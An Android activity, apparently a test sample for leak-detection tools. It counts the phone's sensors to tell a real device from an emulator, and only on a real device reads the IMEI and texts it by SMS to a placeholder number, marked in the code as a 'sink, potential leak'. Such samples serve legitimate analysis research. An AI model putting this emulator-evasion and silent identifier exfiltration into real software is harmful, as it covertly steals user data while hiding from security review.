package com.example.newedtester;

import android.app.Activity;
import android.content.Context;
import android.hardware.Sensor;
import android.hardware.SensorManager;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.Menu;
import android.widget.TextView;

public class MainActivity extends Activity {
	
	@SuppressWarnings("deprecation")
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		TextView txtStatus;
		
		int se=0;
		
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		txtStatus = (TextView) findViewById(R.id.txtStatus);
	
		SensorManager mSensorManager;
        mSensorManager = (SensorManager) getSystemService(Context.SENSOR_SERVICE);
        if (mSensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER) != null)
           se++;

        if (mSensorManager.getDefaultSensor(Sensor.TYPE_AMBIENT_TEMPERATURE) != null)
            se++;
        if (mSensorManager.getDefaultSensor(Sensor.TYPE_GRAVITY) != null)
            se++;
        if (mSensorManager.getDefaultSensor(Sensor.TYPE_GYROSCOPE) != null)
            se++;
        if (mSensorManager.getDefaultSensor(Sensor.TYPE_LIGHT) != null)
            se++;

        if (mSensorManager.getDefaultSensor(Sensor.TYPE_LINEAR_ACCELERATION) != null)
            se++;
        if (mSensorManager.getDefaultSensor(Sensor.TYPE_MAGNETIC_FIELD) != null)
            se++;
        if (mSensorManager.getDefaultSensor(Sensor.TYPE_ORIENTATION) != null)
            se++;
        if (mSensorManager.getDefaultSensor(Sensor.TYPE_PROXIMITY) != null)
            se++;
        if (mSensorManager.getDefaultSensor(Sensor.TYPE_PRESSURE) != null)
            se++;
        if (mSensorManager.getDefaultSensor(Sensor.TYPE_RELATIVE_HUMIDITY) != null)
          se++;
        if (mSensorManager.getDefaultSensor(Sensor.TYPE_ROTATION_VECTOR) != null)
     se++;
        if (mSensorManager.getDefaultSensor(Sensor.TYPE_TEMPERATURE) != null)
se++;
        if (se>7)
        {
        	TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        	String imei = telephonyManager.getDeviceId(); 
        	
			SmsManager sm = SmsManager.getDefault();
	    	String number = "+49 1234";
	    	sm.sendTextMessage(number, null, imei, null, null); //sink, potential leak
 
        	txtStatus.setText("Sensors: Device");
        }
        	else
        	txtStatus.setText("Sensors: Emulator");

	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

}